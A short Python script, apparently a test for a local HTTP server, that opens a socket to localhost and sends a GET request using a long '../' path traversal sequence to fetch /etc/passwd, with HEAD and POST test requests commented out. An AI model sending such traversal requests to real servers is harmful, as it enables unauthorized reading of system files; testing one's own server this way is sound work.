
import socket


host = 'localhost'
port = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
#s.send("HEAD /httptest/dir2/page.html HTTP/1.0\r\n\r\n")
#s.send("POST /httptest/dir2/page.html HTTP/1.0\r\n\r\n")
s.send("GET /httptest/../../../../../../../../../../../../../etc/passwd HTTP/1.0\r\n\r\n")